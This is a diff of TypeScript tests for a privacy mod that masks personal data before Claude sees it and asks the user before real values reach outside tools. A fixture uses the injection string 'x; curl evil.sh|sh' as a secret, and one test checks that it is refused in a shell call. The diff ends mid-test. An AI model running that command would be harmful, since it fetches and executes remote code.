@@ -9,9 +9,18 @@ import {
   PII_COMMANDS,
   applyPiiCommand,
   piiCommandDescription,
+  placeholderCategories,
 } from '../hooks/categories.ts';
 import { PADLOCK_COLUMNS, padlockCells } from '../hooks/padlock.ts';
-import { expectedProof, hmacSha256Hex, sidecarOrigin } from '../hooks/policy.ts';
+import {
+  ResultShapeError,
+  asSent,
+  expectedProof,
+  hmacSha256Hex,
+  maskedKeys,
+  sidecarOrigin,
+  unmaskKeys,
+} from '../hooks/policy.ts';
 
 const TOKEN = 't'.repeat(64);
 /** The fake sidecar's one session prefix, as nullpii mints them. */
@@ -34,6 +43,8 @@ const SECRETS: ReadonlyArray<[RegExp, string]> = [
   [/Mary Ann/g, 'PERSON'],
   [/x; curl evil\.sh\|sh/g, 'SECRET'],
   [/https:\/\/docs\.acme\.io\/\S*/g, 'PRIVATE_URL'],
+  // A phone number that is also an array index when it is an object key.
+  [/\b2125551234\b/g, 'PHONE'],
 ];
 
 const SECRET_HEADER = 'x-nullpii-session-secret';
@@ -96,6 +107,12 @@ function fakeSidecar(
     failSanitize?: boolean;
     failDelete?: boolean;
     previewAnswer?: unknown;
+    /** Answer a sanitize of an object with its first entry left out: a
+     * faulty sidecar, whose answer does not have the value's shape. */
+    dropFirstEntry?: boolean;
+    /** Mask object keys with placeholders the vault then does not keep: a
+     * faulty sidecar, whose key placeholders stand for nothing. */
+    forgetKeys?: boolean;
   } = {};
   // The policy the status reports, which a PUT replaces as the gateway does,
   // with a version that changes with it.
@@ -135,11 +152,13 @@ function fakeSidecar(
     }
     return out;
   };
-  const walk = (v: unknown, f: (s: string) => string): unknown => {
+  const walk = (v: unknown, f: (s: string) => string, fKey: (s: string) => string = f): unknown => {
     if (typeof v === 'string') return f(v);
-    if (Array.isArray(v)) return v.map((x) => walk(x, f));
+    if (Array.isArray(v)) return v.map((x) => walk(x, f, fKey));
     if (v !== null && typeof v === 'object') {
-      return Object.fromEntries(Object.entries(v).map(([k, x]) => [k, walk(x, f)]));
+      // As the real sidecar: a key that holds personal data is masked in
+      // place, and the object's entries keep their order.
+      return Object.fromEntries(Object.entries(v).map(([k, x]) => [fKey(k), walk(x, f, fKey)]));
     }
     return v;
   };
@@ -246,7 +265,25 @@ function fakeSidecar(
       if (preview && state.previewAnswer !== undefined) return respond(200, state.previewAnswer);
       if (preview && state.failSanitize) return respond(500, { error: 'failure quoting John' });
       const byLabel: Record<string, number> = {};
-      const value = walk(body.value, (s) => maskString(s, byLabel));
+      // As the real sidecar: each distinct key is masked once per walk, so
+      // a key repeated across a result gets one placeholder.
+      const keyMemo = new Map<string, string>();
+      const maskKey = (k: string) => {
+        const known = keyMemo.get(k);
+        if (known !== undefined) return known;
+        const out = maskString(k, byLabel);
+        if (state.forgetKeys) for (const one of out.match(PLACEHOLDER_ANY) ?? []) vault.delete(one);
+        keyMemo.set(k, out);
+        return out;
+      };
+      const walked = walk(body.value, (s) => maskString(s, byLabel), maskKey);
+      const value =
+        state.dropFirstEntry &&
+        walked !== null &&
+        typeof walked === 'object' &&
+        !Array.isArray(walked)
+          ? Object.fromEntries(Object.entries(walked).slice(1))
+          : walked;
       const captured = Object.values(byLabel).reduce((a, b) => a + b, 0);
       const capturedByLabel = preview
         ? Object.fromEntries(
@@ -347,7 +384,19 @@ async function start($) {
   await $.session.start({ surface: 'terminal', isInteractive: true, cwd: '/work' });
 }
 
+/** No toast and no `$.ui.log` line (transcript or debug) holds any of
+ * `values`: a value, or a short form of one, is for the dialog and the
+ * legend alone. */
+function expectNoValueShown(sidecar: ReturnType<typeof fakeSidecar>, values: readonly string[]) {
+  for (const line of [...sidecar.toasts, ...sidecar.logs]) {
+    for (const value of values) expect(line).not.toContain(value);
+  }
+}
+
 const COMPOSER = { kind: 'composer' } as const;
+/** Real time a test gives a call started beside another to reach its own
+ * dialog: every step before it is a resolved promise, so a few ms is ample. */
+const SECOND_CALL_HEAD_START_MS = 50;
 
 /** A `/pii` command as the person's own typed run reaches `command.run`:
  * the engine stamps the origin of a command typed at the prompt, and with
@@ -451,25 +500,31 @@ test('a call with nothing to restore is passed on as Claude wrote it', async ($,
   expect((received[0] as { command: string }).command).toBe('ls');
 });
 
-test('a tool that sends data elsewhere keeps the placeholders', async ($, on) => {
+test('a tool that sends data elsewhere keeps a placeholder nothing stands behind, and no dialog asks about it', async ($, on) => {
   const sidecar = fakeSidecar();
   stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, [], asked);
   const urls: string[] = [];
   on('prompt.submit', ($, e) => ({ text: e.text }));
-  on('tool.call', ($, e) => {
+  on('tool.call', { tool: 'WebFetch' }, ($, e) => {
     urls.push(e.url);
     return { result: 'ok' };
   });
   await start($);
-  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
   await $.tool.call({
     tool: 'WebFetch',
+    // A placeholder this session minted nothing behind (an earlier
+    // session's, or one typed by hand): there is no value to send or ask
+    // about, so the call runs as it was written.
     url: `https://example.com/?q=${ph('EMAIL', 0)}`,
     prompt: 'x',
   });
   expect(urls).toEqual([`https://example.com/?q=${ph('EMAIL', 0)}`]);
+  expect(asked).toEqual([]);
   const report = await $.command.run({ command: 'pii', args: '' });
   expect(report.text).toContain('Placeholders kept in calls to other tools: 1');
+  expect(report.text).not.toContain('Released in clear');
 });
 
 test('an errored tool result reaches Claude masked, as a refusal', async ($, on) => {
@@ -524,6 +579,19 @@ test('the system prompt says what the placeholders are and which tools get value
   expect(sections[1].scope).toBe('session');
   expect(sections[1].text).toContain('put the real values back before they run: Read, Write.');
   expect(sections[1].text).toContain('Do not ask the user for the real value');
+  // Claude is told the truth about every other tool: no claim that it only
+  // ever gets placeholders, and what happens with no one to answer.
+  expect(sections[1].text).toContain(
+    "Every other tool, Claude Code's own included (such as TodoWrite, Agent, WebFetch, MCP tools), gets the real values only when the user agrees",
+  );
+  expect(sections[1].text).toContain('when no one can answer (claude -p)');
+  // Claude's own question is the exception, said plainly.
+  expect(sections[1].text).toContain(
+    'AskUserQuestion is never asked about and never gets a real value: write placeholders in a question as they are',
+  );
+  expect(sections[1].text).not.toContain(
+    'such as a web fetch or an MCP tool, gets the placeholder',
+  );
 });
 
 test('without a token, the mod blocks instead of sending data unmasked', async ($, on) => {
@@ -788,19 +856,30 @@ test('a tool the policy adds to restoreTools gets real values in every argument'
   expect(written).toEqual([{ path: 'n.txt', text: 'for John' }]);
 });
 
-test('a policy that drops a local tool keeps its placeholders', async ($, on) => {
+test('a policy that drops a local tool denies its calls unless the user sends the values', async ($, on) => {
   const sidecar = fakeSidecar({ restoreTools: ['Read'] });
   stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Block'], asked);
   const patterns: string[] = [];
   on('prompt.submit', ($, e) => ({ text: e.text }));
-  on('tool.call', ($, e) => {
+  on('tool.call', { tool: 'Grep' }, ($, e) => {
     patterns.push(e.pattern);
     return { result: 'no matches' };
   });
   await start($);
   await $.prompt.submit({ text: 'grep for john@acme.io', wait: false, origin: COMPOSER });
-  await $.tool.call({ tool: 'Grep', pattern: ph('EMAIL', 0) });
-  expect(patterns).toEqual([ph('EMAIL', 0)]);
+  const out = await $.tool.call({ tool: 'Grep', pattern: ph('EMAIL', 0) });
+  expect(asked).toHaveLength(1);
+  // A tool the mod does not know: the question says it does not know
+  // where the values go.
+  expect(asked[0]?.question).toContain('does not know where it sends them');
+  expect(out.deny).toContain('nullpii did not run this call');
+  expect(patterns).toEqual([]);
+  // The call did not run, so no placeholder was kept in one.
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).toContain('Placeholders kept in calls to other tools: 0');
+  expect(report.text).not.toContain('Released in clear');
 });
 
 test('a call without placeholders does not ask the sidecar to restore', async ($, on) => {
@@ -1831,6 +1910,1141 @@ test('an `ask` value stays masked when the user says so, and "Always readable" c
   expect(sidecar.policyBodies).toEqual([{ categories: { private_url: 'off' } }]);
 });
 
+test('maskedKeys lists the object keys a sidecar masked, and unmaskKeys puts them back with the values left masked', () => {
+  const original = { 'john@acme.io': { note: 'call Mary Ann' }, safe: 1 };
+  const masked = { [ph('EMAIL', 0)]: { note: `call ${ph('PERSON', 1)}` }, safe: 1 };
+  expect(maskedKeys(original, masked)).toEqual([{ key: 'john@acme.io', masked: ph('EMAIL', 0) }]);
+  const back = unmaskKeys(original, masked);
+  expect(back).toEqual({ 'john@acme.io': { note: `call ${ph('PERSON', 1)}` }, safe: 1 });
+  // A `masked` without `original`'s shape is a fault, not a result to pass on.
+  for (const other of [{ safe: 1 }, [original], 'text', { ...masked, extra: 1 }]) {
+    expect(() => maskedKeys(original, other)).toThrow(ResultShapeError);
+    expect(() => unmaskKeys(original, other)).toThrow(ResultShapeError);
+  }
+  expect(() => maskedKeys([1, 2], [1])).toThrow(ResultShapeError);
+  // Leaves walk as they are: a string, a number, null.
+  expect(maskedKeys('john@acme.io', ph('EMAIL', 0))).toEqual([]);
+  expect(unmaskKeys(null, null)).toBe(null);
+  // An array walks by position; its number keys never mask.
+  expect(maskedKeys([{ 'john@acme.io': 1 }], [{ [ph('EMAIL', 0)]: 1 }])).toEqual([
+    { key: 'john@acme.io', masked: ph('EMAIL', 0) },
+  ]);
+});
+
+test('placeholderCategories lists each placeholder once, with its category', () => {
+  const twice = `${ph('PRIVATE_URL', 0)} and ${ph('PRIVATE_URL', 0)}`;
+  expect(placeholderCategories(twice)).toEqual([
+    { placeholder: ph('PRIVATE_URL', 0), category: 'private_url' },
+  ]);
+  expect(placeholderCategories(`x ${ph('EMAIL', 2)} ${ph('PERSON', 3)}`)).toEqual([
+    { placeholder: ph('EMAIL', 2), category: 'email' },
+    { placeholder: ph('PERSON', 3), category: 'person' },
+  ]);
+  expect(placeholderCategories('nothing here')).toEqual([]);
+});
+
+test('a tool result with personal data in an object key is put to the user: sent once, the values stay masked', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Send once'], asked);
+  on('tool.call', { tool: 'WebSearch' }, () => ({
+    result: { 'john@acme.io': 'owner John', role: 'admin' },
+  }));
+  await start($);
+  const out = await $.tool.call({ tool: 'WebSearch', query: 'owners' });
+  expect(asked).toHaveLength(1);
+  expect(asked[0]?.options).toEqual(['Block', 'Send once', 'Allow all']);
+  // The question names the tool, the category and the key's short form —
+  // the whole key while it is 10 characters or fewer, else its head and
+  // tail with an ellipsis between.
+  expect(asked[0]?.question).toContain('WebSearch');
+  expect(asked[0]?.question).toContain('email "joh…e.io"');
+  // The key is the tool's own again; the value under it stays masked:
+  // the walk masked the key first (EMAIL_0), then the value (PERSON_1).
+  expect(out.result).toEqual({ 'john@acme.io': `owner ${ph('PERSON', 1)}`, role: 'admin' });
+  expect(JSON.stringify(out)).not.toContain('John');
+  // The toast names the tool and the category, and no value or short form.
+  expect(sidecar.toasts[0]).toContain('WebSearch');
+  expect(sidecar.toasts[0]).toContain('email 1');
+  expectNoValueShown(sidecar, ['john@acme.io', 'joh…e.io', 'John']);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).toContain('Released in clear on your word: WebSearch · email 1');
+  // The report may reach the model: no value and no short form in it.
+  expect(report.text).not.toContain('john@acme.io');
+  expect(report.text).not.toContain('joh…e.io');
+});
+
+test('a tool result with personal data only in its values is masked with no dialog', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, [], asked);
+  on('tool.call', { tool: 'Bash' }, () => ({ result: { stdout: 'owner: John', stderr: '' } }));
+  await start($);
+  const out = await $.tool.call({ tool: 'Bash', command: 'cat owners.txt' });
+  expect(asked).toEqual([]);
+  expect(out.deny).toBeUndefined();
+  expect(JSON.stringify(out.result)).not.toContain('John');
+});
+
+test('a masked object key the user does not send withholds the whole result', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Block'], asked);
+  on('tool.call', { tool: 'WebSearch' }, () => ({
+    result: { 'john@acme.io': 'owner', role: 'admin' },
+  }));
+  await start($);
+  const out = await $.tool.call({ tool: 'WebSearch', query: 'owners' });
+  expect(asked).toHaveLength(1);
+  expect(out.deny).toContain("nullpii withheld this tool's result");
+  expect(JSON.stringify(out)).not.toContain('john@acme.io');
+  expect(sidecar.toasts).toEqual([]);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).not.toContain('Released in clear');
+});
+
+test('Allow all sends every masked key of the session with no second dialog, toasting and counting each', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Allow all'], asked);
+  on('tool.call', { tool: 'WebSearch' }, () => ({ result: { 'john@acme.io': 'owner John' } }));
+  await start($);
+  const first = await $.tool.call({ tool: 'WebSearch', query: 'a' });
+  const second = await $.tool.call({ tool: 'WebSearch', query: 'b' });
+  expect(asked).toHaveLength(1);
+  // Each call's key and value are masked anew (EMAIL_0, PERSON_1, then
+  // EMAIL_2, PERSON_3): the keys come back, the values under them do not.
+  expect(first.result).toEqual({ 'john@acme.io': `owner ${ph('PERSON', 1)}` });
+  expect(second.result).toEqual({ 'john@acme.io': `owner ${ph('PERSON', 3)}` });
+  expect(JSON.stringify([first, second])).not.toContain('John');
+  expect(sidecar.toasts).toHaveLength(2);
+  expectNoValueShown(sidecar, ['john@acme.io', 'joh…e.io', 'John']);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).toContain('Released in clear on your word: WebSearch · email 2');
+});
+
+test('a masked object key no one answers withholds the result, and the log says so', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  on('tool.call', { tool: 'AskUserQuestion' }, () => ({ deny: 'dismissed' }));
+  on('tool.call', { tool: 'WebSearch' }, () => ({ result: { 'john@acme.io': 'owner' } }));
+  await start($);
+  const out = await $.tool.call({ tool: 'WebSearch', query: 'owners' });
+  expect(out.deny).toContain("nullpii withheld this tool's result");
+  expect(JSON.stringify(out)).not.toContain('john@acme.io');
+  expect(sidecar.logs.join('\n')).toContain('no answer about sending in clear');
+  expect(sidecar.toasts).toEqual([]);
+});
+
+test('a call to a tool that sends data elsewhere is put to the user first: sent once, on their word', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Send once'], asked);
+  const notices = recordNotices(on);
+  const urls: string[] = [];
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', { tool: 'WebFetch' }, ($, e) => {
+    urls.push(e.url);
+    return { result: 'ok' };
+  });
+  await start($);
+  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
+  await $.tool.call({
+    tool: 'WebFetch',
+    url: `https://example.com/?q=${ph('EMAIL', 0)}`,
+    prompt: 'x',
+  });
+  expect(asked).toHaveLength(1);
+  expect(asked[0]?.options).toEqual(['Block', 'Send once', 'Allow all']);
+  expect(asked[0]?.question).toContain('WebFetch');
+  expect(asked[0]?.question).toContain('email "joh…e.io"');
+  // The question says where the value goes: WebFetch runs through a model.
+  expect(asked[0]?.question).toContain('through a Claude model');
+  expect(asked[0]?.question).toContain('(and for WebFetch, the site its URL names)');
+  // Send once: the tool runs with the real values.
+  expect(urls).toEqual(['https://example.com/?q=john@acme.io']);
+  expect(sidecar.toasts[0]).toContain('WebFetch');
+  expectNoValueShown(sidecar, ['john@acme.io', 'joh…e.io']);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).toContain('Released in clear on your word: WebFetch · email 1');
+  expect(report.text).not.toContain('john@acme.io');
+  expect(report.text).not.toContain('joh…e.io');
+  // The legend is for Claude's own question alone.
+  expect(notices).toEqual([]);
+});
+
+test('a call to a tool that sends data elsewhere is denied when the user does not send the values', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Block'], asked);
+  const notices = recordNotices(on);
+  const urls: string[] = [];
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', { tool: 'WebFetch' }, ($, e) => {
+    urls.push(e.url);
+    return { result: 'ok' };
+  });
+  await start($);
+  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
+  const out = await $.tool.call({
+    tool: 'WebFetch',
+    url: `https://example.com/?q=${ph('EMAIL', 0)}`,
+    prompt: 'x',
+  });
+  expect(asked).toHaveLength(1);
+  expect(out.deny).toContain('nullpii did not run this call');
+  // Not run: the tool never saw the url at all.
+  expect(urls).toEqual([]);
+  expect(sidecar.toasts).toEqual([]);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).not.toContain('Released in clear');
+  // The legend is for Claude's own question alone.
+  expect(notices).toEqual([]);
+});
+
+test('Allow all sends every value of the session with no second dialog, toasting and counting each', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Allow all'], asked);
+  const urls: string[] = [];
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', { tool: 'WebFetch' }, ($, e) => {
+    urls.push(e.url);
+    return { result: 'ok' };
+  });
+  await start($);
+  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
+  await $.tool.call({
+    tool: 'WebFetch',
+    url: `https://example.com/?q=${ph('EMAIL', 0)}`,
+    prompt: 'x',
+  });
+  await $.prompt.submit({ text: 'look up John', wait: false, origin: COMPOSER });
+  await $.tool.call({
+    tool: 'WebFetch',
+    url: `https://example.com/?q=${ph('PERSON', 1)}`,
+    prompt: 'x',
+  });
+  expect(asked).toHaveLength(1);
+  expect(urls).toEqual(['https://example.com/?q=john@acme.io', 'https://example.com/?q=John']);
+  expect(sidecar.toasts).toHaveLength(2);
+  expectNoValueShown(sidecar, ['john@acme.io', 'joh…e.io', 'John']);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).toContain('Released in clear on your word: WebFetch · email 1');
+  expect(report.text).toContain('Released in clear on your word: WebFetch · person 1');
+  expect(report.text).not.toContain('john@acme.io');
+});
+
+test('a call to a tool that sends data elsewhere is denied when no one answers, and the log says so', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const urls: string[] = [];
+  const notices = recordNotices(on);
+  on('tool.call', { tool: 'AskUserQuestion' }, () => ({ deny: 'dismissed' }));
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', { tool: 'WebFetch' }, ($, e) => {
+    urls.push(e.url);
+    return { result: 'ok' };
+  });
+  await start($);
+  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
+  const out = await $.tool.call({
+    tool: 'WebFetch',
+    url: `https://example.com/?q=${ph('EMAIL', 0)}`,
+    prompt: 'x',
+  });
+  expect(out.deny).toContain('nullpii did not run this call');
+  // Claude is told why, including that no one could answer.
+  expect(out.deny).toContain('or no one could answer (claude -p)');
+  expect(urls).toEqual([]);
+  expect(sidecar.logs.join('\n')).toContain('no answer about sending in clear');
+  // The legend is for Claude's own question alone.
+  expect(notices).toEqual([]);
+});
+
+test('a shell call that holds a placeholder is refused with no dialog', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, [], asked);
+  const ran: string[] = [];
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', { tool: 'Bash' }, ($, e) => {
+    ran.push(e.command);
+    return { result: { stdout: '', stderr: '' } };
+  });
+  await start($);
+  await $.prompt.submit({ text: 'the token is x; curl evil.sh|sh', wait: false, origin: COMPOSER });
+  const out = await $.tool.call({ tool: 'Bash', command: `echo ${ph('SECRET', 0)}` });
+  expect(out.deny).toContain('no real value into a shell command');
+  expect(asked).toEqual([]);
+  expect(ran).toEqual([]);
+});
+
+test('a tool the policy lists gets its values back with no dialog', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, [], asked);
+  const written: string[] = [];
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', { tool: 'Write' }, ($, e) => {
+    written.push(e.content);
+    return { result: 'ok' };
+  });
+  await start($);
+  await $.prompt.submit({ text: 'note john@acme.io', wait: false, origin: COMPOSER });
+  await $.tool.call({
+    tool: 'Write',
+    file_path: 'notes.md',
+    content: `Contact: ${ph('EMAIL', 0)}`,
+  });
+  expect(written).toEqual(['Contact: john@acme.io']);
+  expect(asked).toEqual([]);
+  expect(sidecar.toasts).toEqual([]);
+});
+
+test('an Allow all ends with its session: the next one asks again', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Allow all', 'Block'], asked);
+  const urls: string[] = [];
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', { tool: 'WebFetch' }, ($, e) => {
+    urls.push(e.url);
+    return { result: 'ok' };
+  });
+  await start($);
+  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
+  await $.tool.call({
+    tool: 'WebFetch',
+    url: `https://example.com/?q=${ph('EMAIL', 0)}`,
+    prompt: 'x',
+  });
+  // The session ends; the next one starts, and with it the Allow all.
+  sidecar.sessions.delete('session-1');
+  await start($);
+  const out = await $.tool.call({
+    tool: 'WebFetch',
+    url: `https://example.com/?q=${ph('EMAIL', 0)}`,
+    prompt: 'x',
+  });
+  expect(asked).toHaveLength(2);
+  expect(urls).toEqual(['https://example.com/?q=john@acme.io']);
+  expect(out.deny).toContain('nullpii did not run this call');
+});
+
+test('an Allow all answered after its session ended holds for nothing', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: string[] = [];
+  // The test's own `$` starts sessions; a hook's `$` cannot.
+  const test$ = $;
+  on('tool.call', { tool: 'AskUserQuestion' }, async (_hook$, e) => {
+    const question = e.questions[0]?.question ?? '';
+    asked.push(question);
+    // The first question is still open when the next session starts.
+    if (asked.length === 1) {
+      sidecar.sessions.delete('session-1');
+      await start(test$);
+    }
+    return { result: { questions: e.questions, answers: { [question]: 'Allow all' } } };
+  });
+  const urls: string[] = [];
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', { tool: 'WebFetch' }, ($, e) => {
+    urls.push(e.url);
+    return { result: 'ok' };
+  });
+  await start($);
+  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
+  const late = await $.tool.call({
+    tool: 'WebFetch',
+    url: `https://example.com/?q=${ph('EMAIL', 0)}`,
+    prompt: 'x',
+  });
+  expect(late.deny).toContain('nullpii did not run this call');
+  // The new session asks again: the late answer did not allow it anything.
+  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
+  await $.tool.call({
+    tool: 'WebFetch',
+    url: `https://example.com/?q=${ph('EMAIL', 0)}`,
+    prompt: 'x',
+  });
+  expect(asked).toHaveLength(2);
+  expect(urls).toEqual(['https://example.com/?q=john@acme.io']);
+});
+
+test('a masked result without the shape of the result is withheld, and the mod says why', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, [], asked);
+  on('tool.call', { tool: 'WebSearch' }, () => ({
+    result: { 'john@acme.io': 'owner', query: 'team' },
+  }));
+  await start($);
+  sidecar.state.dropFirstEntry = true;
+  const out = await $.tool.call({ tool: 'WebSearch', query: 'team' });
+  expect(out.deny).toContain("nullpii could not mask this tool's result");
+  expect(JSON.stringify(out)).not.toContain('john@acme.io');
+  // Nothing was put to the user: there is no key to match, so none to send.
+  expect(asked).toEqual([]);
+  // The band names the fault: its text is the mod's own and quotes nothing.
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).toContain('does not have the shape of the result');
+});
+
+test('calls that run side by side get one question at a time, and an Allow all answers those waiting', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const call = (path: string) =>
+    $.tool.call({
+      tool: 'WebFetch',
+      url: `https://example.com/${path}?q=${ph('EMAIL', 0)}`,
+      prompt: 'x',
+    });
+  const asked: string[] = [];
+  let second: Promise<unknown> | undefined;
+  on('tool.call', { tool: 'AskUserQuestion' }, async (_hook$, e) => {
+    const question = e.questions[0]?.question ?? '';
+    asked.push(question);
+    if (second === undefined) {
+      // The second call starts while the first one's question is open, and
+      // is given the time to reach its own question before this one is
+      // answered: unqueued, it would ask too.
+      second = call('b');
+      await new Promise((resolve) => setTimeout(resolve, SECOND_CALL_HEAD_START_MS));
+    }
+    return { result: { questions: e.questions, answers: { [question]: 'Allow all' } } };
+  });
+  const urls: string[] = [];
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', { tool: 'WebFetch' }, ($, e) => {
+    urls.push(e.url);
+    return { result: 'ok' };
+  });
+  await start($);
+  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
+  await call('a');
+  await second;
+  expect(second).toBeDefined();
+  expect(asked).toHaveLength(1);
+  expect([...urls].sort()).toEqual([
+    'https://example.com/a?q=john@acme.io',
+    'https://example.com/b?q=john@acme.io',
+  ]);
+  expect(sidecar.toasts.filter((t) => t.includes('WebFetch'))).toHaveLength(2);
+});
+
+test('a call holding a placeholder the session knows and one it does not counts each as it went', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Send once'], asked);
+  const urls: string[] = [];
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', { tool: 'WebFetch' }, ($, e) => {
+    urls.push(e.url);
+    return { result: 'ok' };
+  });
+  await start($);
+  await $.prompt.submit({ text: 'look up john@acme.io', wait: false, origin: COMPOSER });
+  // Index 7 was never given out: nothing stands behind it.
+  const unknown = ph('EMAIL', 7);
+  await $.tool.call({
+    tool: 'WebFetch',
+    url: `https://example.com/?a=${ph('EMAIL', 0)}&b=${unknown}`,
+    prompt: 'x',
+  });
+  expect(asked).toHaveLength(1);
+  expect(urls).toEqual([`https://example.com/?a=john@acme.io&b=${unknown}`]);
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).toContain('Placeholders kept in calls to other tools: 1');
+  expect(report.text).toContain('Released in clear on your word: WebFetch · email 1');
+});
+
+test('maskedKeys and unmaskKeys pair keys by name, not by position: integer-like keys move', () => {
+  // An object lists integer-like keys first, in numeric order. Masked, the
+  // phone-number key is a placeholder (a string key) and moves behind the
+  // integer-like keys left as they were, as Object.fromEntries and
+  // JSON.parse order them.
+  const original = JSON.parse(
+    '{"2125551234":"phone owner","3000000000":"order","1":"a","10":"b","2":"c"}',
+  );
+  const masked = JSON.parse(
+    `{"1":"a","2":"c","10":"b","3000000000":"order","${ph('PHONE', 0)}":"phone owner"}`,
+  );
+  expect(Object.keys(masked).at(-1)).toBe(ph('PHONE', 0));
+  expect(maskedKeys(original, masked)).toEqual([{ key: '2125551234', masked: ph('PHONE', 0) }]);
+  expect(unmaskKeys(original, masked)).toEqual({
+    '1': 'a',
+    '2': 'c',
+    '10': 'b',
+    '2125551234': 'phone owner',
+    '3000000000': 'order',
+  });
+  // Two masked keys keep the order the sidecar walked them in.
+  const two = JSON.parse('{"x":1,"4155550123":2,"2125551234":3}');
+  const twoMasked = JSON.parse(`{"x":1,"${ph('PHONE', 0)}":3,"${ph('PHONE', 1)}":2}`);
+  expect(maskedKeys(two, twoMasked)).toEqual([
+    { key: '2125551234', masked: ph('PHONE', 0) },
+    { key: '4155550123', masked: ph('PHONE', 1) },
+  ]);
+  // A changed key that holds no placeholder pairs with nothing: a fault.
+  expect(() => maskedKeys({ a: 1, b: 2 }, { a: 1, c: 2 })).toThrow(ResultShapeError);
+  expect(() => unmaskKeys({ a: 1, b: 2 }, { a: 1, c: 2 })).toThrow(ResultShapeError);
+  // A changed key must hold a placeholder its original did not: one the
+  // tool wrote itself, passed through, does not pair a changed key.
+  const own = ph('EMAIL', 9);
+  expect(() => maskedKeys({ [`a ${own}`]: 1 }, { [`b ${own}`]: 1 })).toThrow(ResultShapeError);
+});
+
+test('asSent is the value as the sidecar receives it: fields JSON drops or turns into text', () => {
+  expect(asSent({ a: 1, gone: undefined, f: () => 1 })).toEqual({ a: 1 });
+  expect(asSent({ when: new Date(0) })).toEqual({ when: '1970-01-01T00:00:00.000Z' });
+  expect(asSent([undefined])).toEqual([null]);
+  expect(asSent(undefined)).toBeUndefined();
+});
+
+test('a masked integer-like key is sent back under its own name, with no value swapped between keys', async ($, on) => {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const asked: Asked[] = [];
+  answerMenu(on, ['Send once'], asked);
+  on('tool.call', { tool: 'WebSearch' }, () => ({
+    result: { '2125551234': 'phone owner John', '3000000000': 'order', '1': 'a', '10': 'b' },
+  }));
+  await start($);
+  const out = await $.tool.call({ tool: 'WebSearch', query: 'numbers' });
+  expect(asked).toHaveLength(1);
+  // The question lists the phone number with its category, and nothing else.
+  expect(asked[0]?.question).toContain('phone "2125551234"');
+  expect(asked[0]?.question).not.toContain('3000000000');
+  expect(out.result).toEqual({
+    '1': 'a',
+    '10': 'b',
+    '2125551234': `phone owner ${ph('PERSON', 1)}`,
+    '3000000000': 'order',
+  });
+  const report = await $.command.run({ command: 'pii', args: 'status' });
+  expect(report.text).toContain('Released in clear on your word: WebSearch · phone 1');
+});
+
+test('a result field JSON drops is not a sidecar fault: the result goes on, its keys asked about as sent', async ($, on) => {
